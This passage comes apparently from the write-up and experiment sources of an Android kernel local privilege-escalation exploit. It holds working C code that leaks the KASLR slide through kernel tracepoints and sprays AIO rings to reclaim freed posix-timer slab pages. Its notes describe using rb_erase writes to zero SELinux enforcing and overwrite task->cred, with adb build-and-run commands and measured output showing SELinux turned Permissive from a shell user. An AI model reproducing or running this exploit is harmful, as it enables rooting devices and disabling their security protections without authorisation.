adb shell /data/local/tmp/tp_reclaim
```

Measured on yingtian / `6.18.21-android17-5-g805aa6adea19`, cold boot
`f545f2f7` (Enforcing, shell uid 2000, no KernelSU), first run after boot:

```
SLIDE 0x2c4e200000
TIMERS created=1584 addrs=1584
WATCH 152 node_watch=152
RINGS 12000
CPU0 rings=1200 seen=592 watch=0      <- trace buffer drops on busy CPUs
CPU1 rings=1200 seen=688 watch=33
CPU3 rings=1200 seen=624 watch=23
CPU8 rings=1200 seen=1200 watch=1
CPU9 rings=1200 seen=1200 watch=8
FILEMAP seen=9673 watch_hits=65 node_hits=65
MATCH cpu=8 ring=492 ctx=0x708446f000 pfn=0x334fa3 node_page=1 magic=0xa10a10a1
```

So 65 rings ended up owning one of the 152 watched node pages, and the ring
could be identified and validated by its io_event magic. An earlier
single-threaded run (3500 rings) showed the same effect with 26 hits.

**Limits measured:**

- repeating the experiment on the same boot yields `watch_hits=0`: every run
  destroys 12,000 AIO contexts at exit and frees ~48 MB of pages, so the next
  rings reuse those instead of the freshly freed slab pages. A real payload
  sprays once, so this is acceptable - but it means "run it twice to check"
  does not work.
- per-CPU trace buffers are small: busy CPUs lose filemap lines (`seen <
  rings`). The matcher must require `seen == rings` for a CPU before trusting
  it, and a real payload should spray fewer rings (hundreds) or raise
  `buffer_size_kb`.

## D. One reap, three writes (three timerqueue bases)

`posix_cputimers` holds three timerqueue bases (`CPUCLOCK_PROF`,
`CPUCLOCK_VIRT`, `CPUCLOCK_SCHED`; rb_node at `TASK+0x870/0x888/0x8a0`,
bases 0x18 apart). The exec thread can arm one timer per base with the
per-thread clockid encoding `((~tid) << 3) | 4 | base`, so all three nodes
live in the same 8 KiB slab page. When that page is reclaimed, the single
`posix_cpu_timers_exit()` walk erases all three nodes and performs three
independent `rb_erase` fast-path writes per reap instead of one.

Each node is loaded with `pc=0, rb_right=0, rb_left=S`, so the erase writes
zero to `S` (`O3P_D3=1`; experiment only, `O3P_NOKSU=1`):

| tile | `S` | effect |
|---|---|---|
| PROF | `selinux_state-7` | 8-byte unaligned zero: `enforcing=0`; `initialized`/`policycap` untouched |
| VIRT | `perf_page+0x10` | zeroes `q[2]`, which held the victim node pointer |
| SCHED | `perf_page+0x18` | zeroes `q[3]`, pre-set to `0xdeadbeef` as a witness |

Build and run:

```
$CC -std=gnu11 -O2 -pthread -I . -I ksu -o build/d3.bin payload/o3p.c
adb push build/d3.bin /data/local/tmp/d3.bin
adb shell 'cd /data/local/tmp; O3P_D3=1 O3P_NOKSU=1 ./d3.bin 10000 14000 300 1 4 1 8000 800'
```

Measured (boot `f545f2f7`, Enforcing, no KernelSU, adb shell uid 2000):

```
D3ADDR a0=0xffffff81bfadd800 a1=0xffffff81bfadd380 a2=0xffffff81bfadcc00 off0=0x1800 off1=0x1380 off2=0xc00
HIT pages=14000
SELWRITE target=0xffffffecd0b59629 want=0x0 val=0x0 SEL_OK state=0x100000101010100
D3PAGE slot0=0x100000 slot1=0x0 slot2=0x0 slot3=0x0
```

`state=0x0100000101010100` proves the unaligned write cleared only byte 0
(`enforcing`), leaving `initialized=1` and `policycap` untouched. `slot2`
went from the timer object pointer to 0 and `slot3` from `0xdeadbeef` to 0,
so the same reap performed the SELinux zero and two controlled zero writes
(`slot0` is restored to `0x100000` by `repair_fake_cred()` after the reap).
`getenforce` reports `Permissive` afterwards, without a reboot.

**Limits:** all three nodes must fall in the same 8 KiB page (observed on
every attempt here, not guaranteed); D3 is a shell-domain experiment and does
not load KernelSU. Combined with the C harness (PFN-verified reclaim) this
becomes a single-reap "cred + enforcing" primitive: `O3P_D3V3=1` retargets the
PROF tile to `task->cred` (`PTASK+0x908`), keeps the VIRT tile at
`selinux_state-7`, and drops the SCHED witness. That combination panicked on
three cold boots (see “Outcome in v3.0”).

## Helper probes

Two tiny utilities used to fire the tracepoint anchors without the full
payload (they are not part of the exploit):

- `tp_timer.c` — `timer_create(CLOCK_THREAD_CPUTIME_ID)` + `timer_delete` in a
  loop; triggers `alloc_posix_timer` so `tp_slide` can sample `TIMER_LINK`.
- `tp_cred.c` — `setresuid(2000,2000,2000)` / `setfsuid` / `setresgid`; forces
  `prepare_creds` so the `CRED_LINK` anchor can be cross-checked.

Build them with the NDK clang like any other host-side test.

## Outcome in v3.0

The A+D single-reap combination was shipped behind `O3P_D3V3` and attempted as
v3a/v3b/v3c; all three cold boots panicked shortly after `D3ADDR` (see
`docs/V3-DESIGN.md`). v3.0 therefore ships the **two-reap** payload: A
(enforcing-only zero) in stage 0 and the proven `task_cred` swap in stage 1, with
KernelSU loaded without the init patch. B/C remain validated prototypes but are
not in the shipped payload.

```

`experiments/tp_cred.c`:

```c
#include <unistd.h>
#include <sys/syscall.h>
int main(void){syscall(SYS_setresuid,2000,2000,2000);syscall(SYS_setfsuid,2000);syscall(SYS_setresgid,2000,2000,2000);return 0;}

```

`experiments/tp_reclaim.c`:

```c
/*
 * tp_reclaim.c - experiment C: PFN-verified page reclaim (tracepoints only).
 *
 * Proves we can tell which AIO ring page owns a reclaimed posix_timers slab
 * page, without kprobes and without perf:
 *
 *   1. static kmem_cache_alloc tracepoint -> k_itimer addresses
 *      (call_site == alloc_posix_timer + slide, bytes_req == 0x180, our pid)
 *   2. mm_page_free / mm_page_alloc text events -> pfn of slab pages
 *   3. filemap:mm_filemap_add_to_page_cache text events -> pfn of each ring
 *      page at io_setup() time, in io_setup() order per CPU
 *
 * Rings are sprayed from one thread per CPU (like a real payload must), so
 * the Nth filemap line of CPU c belongs to ring c/N. A watch pfn that shows
 * up there means that ring owns a page of one of our timer slabs.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define ENCACHE TRACE "/events/kmem/kmem_cache_alloc/enable"

#define PAGE_OFFSET 0xffffff8000000000ULL
#define TIMER_LINK 0xffffffc0803a726cULL
#define KITIMER_NODE 0xe0
#define ALIGN_MASK 0x1fffffULL
#define MAXT 1600
#define MAXCPU 16
#define PERCPU_RINGS 1200

static int wf(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0) return -errno;
	ssize_t n = write(fd, s, strlen(s));
	int e = errno;
	close(fd);
	return n < 0 ? -e : 0;
}

static int trigger(const char *s)
{
	int r = wf(TRIGGER, s);
	if (r == 0 || r == -EEXIST) return 0;
	return r;
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

static int trace_off_on(void)
{
	int fd;
	if (wf(TRACE "/tracing_on", "0\n")) return -1;
	fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
	if (fd < 0) return -1;
	close(fd);
	if (wf(TRACE "/tracing_on", "1\n")) return -1;
	return 0;
}

static int read_raw(unsigned char *buf, size_t cap, size_t *used)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
		      O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	int budget = 300;
	*used = 0;
	if (fd < 0) return -errno;
	while (budget-- > 0 && *used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n > 0) { *used += (size_t)n; budget = 300; continue; }
		if (n == 0) break;
		if (errno != EAGAIN && errno != EINTR) { close(fd); return -1; }
		usleep(1000);
	}
	close(fd);
	return 0;
}

static int g_my_pid;

/* kmem_cache_alloc raw record (relative to call_site): ptr +8, bytes_req +24 */
static int scan_ptr(unsigned char *buf, size_t used, unsigned long req,
		    unsigned long long link, unsigned long long *out, int max)
{
	int n = 0;
	for (size_t i = 4; i + 32 <= used; i++) {
		unsigned long long site, ptr, br;
		int pid;
		memcpy(&site, buf + i, 8);
		if (site != link) continue;
		memcpy(&pid, buf + i - 4, 4);
		if (pid != g_my_pid) continue;
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&br, buf + i + 24, 8);
		if (br != req) continue;
		if ((ptr >> 48) != 0xffff) continue;
		if (n < max) out[n++] = ptr;
	}
	return n;
}

static unsigned long long g_watch[2 * MAXT + 8];
static int g_nwatch;
static unsigned long long g_node_watch[MAXT + 8];
static int g_nnode;

static int cmp_u64(const void *a, const void *b)
{
	unsigned long long x = *(const unsigned long long *)a;
	unsigned long long y = *(const unsigned long long *)b;
	return (x > y) - (x < y);
}

static int has_u64(const unsigned long long *arr, int n, unsigned long long v)
{
	int lo = 0, hi = n - 1;
	while (lo <= hi) {
		int mid = (lo + hi) / 2;
		if (arr[mid] == v) return 1;
		if (arr[mid] < v) lo = mid + 1;
		else hi = mid - 1;
	}
	return 0;
}

static unsigned long long object_pfn(unsigned long long ptr)
{
	return ((ptr & ~0xfffULL) - PAGE_OFFSET) >> 12;
}

static unsigned long long *g_ctx[MAXCPU];
static int g_rings[MAXCPU];
static int g_ncpu;
static volatile int g_spray_go;

static void *spray_thread(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	pin_cpu(cpu);
	g_ctx[cpu] = calloc(PERCPU_RINGS, sizeof(unsigned long long));
	g_rings[cpu] = 0;
	while (!g_spray_go) usleep(1000);
	for (int i = 0; i < PERCPU_RINGS; i++) {
		unsigned long long ctx = 0;
		if (syscall(SYS_io_setup, 1, &ctx) != 0)
			break;
		g_ctx[cpu][g_rings[cpu]++] = ctx;
		if ((g_rings[cpu] & 15) == 0) usleep(200000);
	}
	return NULL;
}

static unsigned long long line_pfn(const char *line)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	unsigned long long v;
	if (!p) return ~0ULL;
	v = strtoull(p + 6, &end, 16);
	return end == p + 6 ? ~0ULL : v;
}

struct cpu_stat {
	int seen, watch_hits, node_hits, hit_index;
	unsigned long long hit_pfn;
};

static void scan_text_cpu(int cpu, struct cpu_stat *st)
{
	char path[160];
	char line[1400];
	FILE *f;
	int idx = 0;
	snprintf(path, sizeof path, TRACE "/per_cpu/cpu%d/trace", cpu);
	f = fopen(path, "r");
	if (!f) return;
	while (fgets(line, sizeof line, f)) {
		if (strstr(line, "mm_filemap_add_to_page_cache:") &&
		    strstr(line, "tp_reclaim")) {
			unsigned long long pfn = line_pfn(line);
			if (pfn != ~0ULL && has_u64(g_watch, g_nwatch, pfn)) {
				int node = has_u64(g_node_watch, g_nnode, pfn);
				if (st->watch_hits == 0) {
					st->hit_index = idx;
					st->hit_pfn = pfn;
				}
				st->watch_hits++;
				if (node) st->node_hits++;
			}
			st->seen++;
			idx++;
		}
	}
	fclose(f);
}

int main(void)
{
	static unsigned char raw[8 << 20];
	size_t used;
	unsigned long long slide = 0;
	static timer_t ids[MAXT];
	int ntimers = 0;
	static unsigned long long addrs[MAXT];
	int naddr = 0;

	g_my_pid = getpid();
	pin_cpu(0);
	g_ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (g_ncpu > MAXCPU) g_ncpu = MAXCPU;

	/* ---- 1. slide --------------------------------------------------- */
	trigger("!enable_event:kmem:kmem_cache_alloc");
	trigger("enable_event:kmem:kmem_cache_alloc");
	for (int round = 0; round < 12 && !slide; round++) {
		struct sigevent ev;
		timer_t id;
		memset(&ev, 0, sizeof ev);
		ev.sigev_notify = SIGEV_NONE;
		if (trace_off_on()) { printf("TRACE_FAIL\n"); return 1; }
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0)
			timer_delete(id);
		wf(TRACE "/tracing_on", "0\n");
		if (read_raw(raw, sizeof raw, &used)) { printf("READ_FAIL\n"); return 1; }
		for (size_t i = 4; i + 32 <= used; i++) {
			unsigned long long site, br, s;
			memcpy(&site, raw + i, 8);
			if ((site >> 48) != 0xffff) continue;
			memcpy(&br, raw + i + 24, 8);
			if (br != 0x180) continue;
			s = site - TIMER_LINK;
			if (s > 0 && s < 0x10000000000ULL && (s & ALIGN_MASK) == 0) {
				slide = s;
				break;
			}
		}
	}
	if (!slide) { printf("NO_SLIDE\n"); return 1; }
	printf("SLIDE 0x%llx\n", slide);

	/* ---- 2. collect k_itimer addresses ------------------------------ */
	for (int batch = 0; batch < 64 && ntimers + 48 <= MAXT; batch++) {
		struct sigevent ev;
		int made = 0;
		memset(&ev, 0, sizeof ev);
		ev.sigev_notify = SIGEV_NONE;
		if (trace_off_on()) break;
		for (int i = 0; i < 48; i++) {
			timer_t id;
			if (timer_create(CLOCK_MONOTONIC, &ev, &id) == 0) {
				ids[ntimers++] = id;
				made++;
			}
		}
		wf(TRACE "/tracing_on", "0\n");
		if (read_raw(raw, sizeof raw, &used)) break;
		{
			unsigned long long tmp[128];
			int n = scan_ptr(raw, used, 0x180, TIMER_LINK + slide, tmp, 128);
			for (int i = 0; i < n && naddr < MAXT; i++)
				addrs[naddr++] = tmp[i];
		}
		if (!made) break;
	}
	printf("TIMERS created=%d addrs=%d\n", ntimers, naddr);
	if (naddr < 32) { printf("TOO_FEW_ADDRS\n"); return 1; }

	/* ---- 3. watch sets ---------------------------------------------- */
	g_nwatch = 0;
	g_nnode = 0;
	for (int i = 0; i < naddr; i++) {
		unsigned long long node = object_pfn(addrs[i] + KITIMER_NODE);
		g_node_watch[g_nnode++] = node;
		g_watch[g_nwatch++] = node;
		g_watch[g_nwatch++] = object_pfn(addrs[i]) & ~1ULL;
	}
	qsort(g_watch, g_nwatch, sizeof(g_watch[0]), cmp_u64);
	{
		int w = 0;
		for (int i = 0; i < g_nwatch; i++)
			if (w == 0 || g_watch[w - 1] != g_watch[i])
				g_watch[w++] = g_watch[i];
		g_nwatch = w;
	}
	qsort(g_node_watch, g_nnode, sizeof(g_node_watch[0]), cmp_u64);
	{
		int w = 0;
		for (int i = 0; i < g_nnode; i++)
			if (w == 0 || g_node_watch[w - 1] != g_node_watch[i])
				g_node_watch[w++] = g_node_watch[i];
		g_nnode = w;
	}
	printf("WATCH %d node_watch=%d\n", g_nwatch, g_nnode);

	/* ---- 4. delete timers, spray per CPU, capture events ------------- */
	trigger("!enable_event:kmem:kmem_cache_alloc");
	trigger("enable_event:kmem:mm_page_free");
	trigger("enable_event:kmem:mm_page_alloc");
	trigger("enable_event:filemap:mm_filemap_add_to_page_cache");
	wf(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n");

	if (wf(TRACE "/tracing_on", "0\n")) return 1;
	{
		int fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
		if (fd >= 0) close(fd);
	}
	if (wf(TRACE "/tracing_on", "1\n")) return 1;

	pthread_t th[MAXCPU];
	int nth = 0;
	g_spray_go = 0;
	for (int c = 0; c < g_ncpu; c++)
		if (pthread_create(&th[nth++], NULL, spray_thread, (void *)(intptr_t)c) != 0)
			break;
	g_spray_go = 1;
	usleep(100000);
	for (int i = 0; i < ntimers; i++)
		timer_delete(ids[i]);
	for (int i = 0; i < nth; i++)
		pthread_join(th[i], NULL);
	wf(TRACE "/tracing_on", "0\n");
	{
		int rings = 0;
		for (int c = 0; c < g_ncpu; c++) rings += g_rings[c];
		printf("RINGS %d\n", rings);
	}

	/* ---- 5. parse text traces --------------------------------------- */
	int total_seen = 0, total_watch = 0, total_node = 0;
	int hit_cpu = -1, hit_idx = -1;
	unsigned long long hit_pfn = 0;
	int free_hits = 0, alloc_hits = 0, order1_frees = 0;
	for (int c = 0; c < g_ncpu; c++) {
		struct cpu_stat st;
		char path[160];
		FILE *f;
		memset(&st, 0, sizeof st);
		scan_text_cpu(c, &st);
		total_seen += st.seen;
		total_watch += st.watch_hits;
		total_node += st.node_hits;
		printf("CPU%d rings=%d seen=%d watch=%d node=%d\n",
		       c, g_rings[c], st.seen, st.watch_hits, st.node_hits);
		if (hit_cpu < 0 && st.watch_hits > 0 &&
		    g_rings[c] > 0 && st.seen == g_rings[c]) {
			hit_cpu = c;
			hit_idx = st.hit_index;
			hit_pfn = st.hit_pfn;
		}
		/* page free/alloc counters */
		snprintf(path, sizeof path, TRACE "/per_cpu/cpu%d/trace", c);
		f = fopen(path, "r");
		if (!f) continue;
		{
			char line[1400];
			while (fgets(line, sizeof line, f)) {
				unsigned long long pfn;
				if (strstr(line, "mm_page_free:")) {
					pfn = line_pfn(line);
					if (strstr(line, "order=1")) order1_frees++;
					if (pfn != ~0ULL && has_u64(g_watch, g_nwatch, pfn))
						free_hits++;
				} else if (strstr(line, "mm_page_alloc:")) {
					pfn = line_pfn(line);
					if (pfn != ~0ULL && has_u64(g_watch, g_nwatch, pfn))
						alloc_hits++;
				}
			}
		}
		fclose(f);
	}
	printf("FILEMAP seen=%d watch_hits=%d node_hits=%d free=%d alloc=%d order1=%d\n",
	       total_seen, total_watch, total_node, free_hits, alloc_hits,
	       order1_frees);

	if (hit_cpu >= 0) {
		unsigned long long ctx = g_ctx[hit_cpu][hit_idx];
		uint32_t magic = 0;
		int node = has_u64(g_node_watch, g_nnode, hit_pfn);
		if (ctx) memcpy(&magic, (void *)(uintptr_t)(ctx + 16), 4);
		printf("MATCH cpu=%d ring=%d ctx=0x%llx pfn=0x%llx node_page=%d magic=0x%x\n",
		       hit_cpu, hit_idx, ctx, hit_pfn, node, magic);
	} else {
		printf("MISS watch=%d node_watch=%d\n", g_nwatch, g_nnode);
	}
	trigger("!enable_event:kmem:mm_page_free");
	trigger("!enable_event:kmem:mm_page_alloc");
	trigger("!enable_event:filemap:mm_filemap_add_to_page_cache");
	printf("done\n");
	return 0;
}

```

`experiments/tp_slide.c`:

```c
/*
 * tp_slide.c (v3) - experiment B: KASLR slide from the static
 * kmem_cache_alloc tracepoint, without kprobes and without perf.
 *
 * Records are read raw from /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw.
 * For kmem_cache_alloc, relative to call_site: site +0, ptr +8, bytes_req +24.
 *
 *   TIMER_LINK = 0xffffffc0803a726c (alloc_posix_timer, bytes_req 0x180)
 *   CRED_LINK  = 0xffffffc08026d1b4 (prepare_creds,     bytes_req 0xb8)
 *
 * The event is enabled once, three samples are taken, then the independent
 * cred anchor is required to reproduce the same slide.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define ENFILE TRACE "/events/kmem/kmem_cache_alloc/enable"

static const unsigned long long TIMER_LINK = 0xffffffc0803a726cULL;
static const unsigned long long CRED_LINK  = 0xffffffc08026d1b4ULL;
static const unsigned long long ALIGN_MASK  = 0x1fffffULL;

static int wf(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0) return -errno;
	ssize_t n = write(fd, s, strlen(s));
	int e = errno;
	close(fd);
	return n < 0 ? -e : 0;
}

static int trigger(const char *s)
{
	int r = wf(TRIGGER, s);
	if (r == 0 || r == -EEXIST) return 0;
	return r;
}

static int enable_state(void)
{
	char b[8] = {0};
	int fd = open(ENFILE, O_RDONLY | O_CLOEXEC);
	if (fd < 0) return -1;
	int n = (int)read(fd, b, sizeof b - 1);
	close(fd);
	if (n <= 0) return -1;
	return b[0] == '1';
}

static int kick_rss(void)
{
	unsigned char *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (wf(TRACE "/events/kmem/rss_stat/enable", "1\n")) return -1;
	if (p != MAP_FAILED) { ((volatile unsigned char *)p)[0] = 1; munmap(p, 4096); }
	wf(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

static int trace_off_on(void)
{
	int fd;
	if (wf(TRACE "/tracing_on", "0\n")) return -1;
	fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
	if (fd < 0) return -1;
	close(fd);
	if (wf(TRACE "/tracing_on", "1\n")) return -1;
	return 0;
}

static int read_raw(unsigned char *buf, size_t cap, size_t *used)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
		      O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	int budget = 200;
	*used = 0;
	if (fd < 0) return -errno;
	while (budget-- > 0 && *used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n > 0) { *used += (size_t)n; budget = 200; continue; }
		if (n == 0) break;
		if (errno != EAGAIN && errno != EINTR) { close(fd); return -1; }
		usleep(1000);
	}
	close(fd);
	return 0;
}

struct hit { unsigned long long site, ptr, slide; };

static int scan(unsigned char *buf, size_t used, unsigned long req,
		unsigned long long link, struct hit *out, int max)
{
	int n = 0;
	for (size_t i = 0; i + 32 <= used; i++) {
		unsigned long long site, ptr, br;
		memcpy(&site, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&br, buf + i + 24, 8);
		if (br != req) continue;
		if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff) continue;
		if (n < max) {
			out[n].site = site;
			out[n].ptr = ptr;
			out[n].slide = site - link;
			n++;
		}
	}
	return n;
}

static unsigned long long sample_timer(unsigned char *buf, size_t cap)
{
	size_t used = 0;
	unsigned long long slide = 0;
	struct sigevent ev;
	timer_t id;
	memset(&ev, 0, sizeof ev);
	ev.sigev_notify = SIGEV_NONE;
	if (trace_off_on()) { printf("TRACE_ON_FAIL\n"); return 0; }
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id) == 0) timer_delete(id);
	else printf("TIMER_FAIL errno=%d\n", errno);
	wf(TRACE "/tracing_on", "0\n");
	if (read_raw(buf, cap, &used)) { printf("READ_FAIL\n"); return 0; }
	struct hit h[64];
	int n = scan(buf, used, 0x180, TIMER_LINK, h, 64);
	for (int i = 0; i < n; i++) {
		if (h[i].slide > 0 && h[i].slide < 0x10000000000ULL &&
		    (h[i].slide & ALIGN_MASK) == 0) {
			slide = h[i].slide;
			printf("SAMPLE raw=%zu site=0x%llx ptr=0x%llx slide=0x%llx\n",
			       used, h[i].site, h[i].ptr, h[i].slide);
			break;
		}
		printf("SAMPLE-UNALIGNED raw=%zu site=0x%llx slide=0x%llx\n",
		       used, h[i].site, h[i].slide);
	}
	if (!n) printf("SAMPLE-EMPTY raw=%zu\n", used);
	return slide;
}

int main(void)
{
	cpu_set_t set;
	unsigned long long cand[3] = {0, 0, 0};
	int n = 0, best = 0, bestc = 0;
	char bootid[64] = "?";
	int bf;
	unsigned char *buf = malloc(8 << 20);
	size_t used = 0;

	if (!buf) return 1;
	CPU_ZERO(&set); CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof set, &set))
		printf("PIN_FAIL errno=%d\n", errno);

	bf = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
	if (bf >= 0) {
		int r = (int)read(bf, bootid, sizeof bootid - 1);
		if (r > 0) { while (r > 0 && (bootid[r-1] == '\n' || bootid[r-1] == '\r')) r--; bootid[r] = 0; }
		close(bf);
	}
	printf("BOOTID %s\n", bootid);
	printf("ENABLE before=%d\n", enable_state());
	trigger("!enable_event:kmem:kmem_cache_alloc\n");
	trigger("enable_event:kmem:kmem_cache_alloc\n");
	if (trigger("enable_event:kmem:kmem_cache_alloc\n"))
		printf("TRIGGER_ENABLE_FAIL\n");
	kick_rss();
	printf("ENABLE after=%d\n", enable_state());

	for (int i = 0; i < 3; i++) {
		unsigned long long s = sample_timer(buf, 8 << 20);
		if (!s) { printf("CAND %d empty\n", i); continue; }
		printf("CAND %d 0x%llx\n", i, s);
		cand[n++] = s;
		if (n >= 2 && cand[0] == cand[1]) break;
	}
	if (!n) { printf("REFUSE none\n"); goto out; }
	for (int i = 0; i < n; i++) {
		int c = 0;
		for (int j = 0; j < n; j++) if (cand[j] == cand[i]) c++;
		if (c > bestc) { bestc = c; best = i; }
	}
	if (n >= 2 && bestc < 2) { printf("REFUSE unstable\n"); goto out; }
	printf("SLIDE 0x%llx samples=%d\n", cand[best], n);

	/* independent anchor: prepare_creds record must carry the same slide */
	if (trace_off_on()) { printf("TRACE_ON_FAIL2\n"); goto out; }
	{
		struct sigevent ev;
		(void)ev;
	}
	syscall(SYS_setresuid, 2000u, 2000u, 2000u);
	syscall(SYS_setfsuid, 2000u);
	wf(TRACE "/tracing_on", "0\n");
	if (read_raw(buf, 8 << 20, &used) == 0) {
		struct hit h[64];
		int m = scan(buf, used, 0xb8, CRED_LINK, h, 64), match = 0;
		for (int i = 0; i < m; i++) {
			int ok = h[i].site == CRED_LINK + cand[best];
			match += ok;
			printf("CREDSITE 0x%llx ptr=0x%llx match=%d\n", h[i].site, h[i].ptr, ok);
		}
		printf("CRED_ANCHOR seen=%d match=%d\n", m, match);
	} else printf("CRED_READ_FAIL\n");

out:
	trigger("!enable_event:kmem:kmem_cache_alloc\n");
	trigger("disable_event:kmem:kmem_cache_alloc\n");
	wf(TRACE "/tracing_on", "0\n");
	free(buf);
	printf("DONE\n");
	return 0;
}

```

#include <stdio.h>
